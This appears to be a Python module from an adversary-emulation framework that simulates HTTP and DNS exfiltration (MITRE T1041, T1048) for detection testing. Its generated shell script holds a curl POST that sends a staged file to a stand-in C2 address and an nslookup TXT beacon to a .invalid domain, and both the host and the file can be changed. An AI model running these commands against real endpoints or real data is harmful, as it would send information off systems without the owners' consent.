# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: exfil_http — Exfiltration (TA0010)
T1041 Exfiltration Over C2 Channel
T1048 Exfiltration Over Alternative Protocol
T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol

SAFE simulation: POSTs a clearly-labelled fake payload to a non-routable
simulation endpoint. No real data is transmitted externally.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "exfil-sim.gloamfire.invalid"
_EXFIL_PAYLOAD = "/tmp/gloamfire_exfil_payload.txt"


@register
class ExfilHttpAttack(BaseAttack):
    name = "exfil_http"
    description = "Simulate HTTP exfiltration of staged data to C2 endpoint (T1041, T1048)"
    mitre = ["T1041", "T1048", "T1048.003"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        payload = params.get("payload_file", _EXFIL_PAYLOAD)
        c2 = params.get("c2_host", "192.0.2.1")
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] Exfiltration simulation starting"

# Build a fake payload to "exfiltrate"
cat > {payload} << 'EOF'
GLOAMFIRE_SIMULATION=true
EXFIL_TYPE=http_post
NOTE=This is NOT real data. Safe simulation only.
FAKE_API_KEY=aaaaaaaaaaaaaaaaaaaaaaaaaaaa
EOF

# T1041 — exfil over C2 channel (HTTP POST to non-routable IP, will fail gracefully)
echo "[Gloamfire] Simulating HTTP POST exfil to {c2}..."
curl -s --max-time 2 --connect-timeout 2 \
  -X POST http://{c2}/exfil \
  -H "Content-Type: application/octet-stream" \
  --data-binary @{payload} 2>/dev/null || true

# T1048 — exfil over alternative protocol (DNS TXT record query)
echo "[Gloamfire] Simulating DNS exfil channel..."
nslookup -type=TXT {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true

echo "[Gloamfire] Exfiltration simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["payload_file"] = payload

        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class ExfilHttpCleanup(BaseAttack):
    name = "exfil_http_cleanup"
    description = "Remove exfil simulation payload file"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        payload = params.get("payload_file", _EXFIL_PAYLOAD)
        return self._exec(target, f"rm -f {payload}")
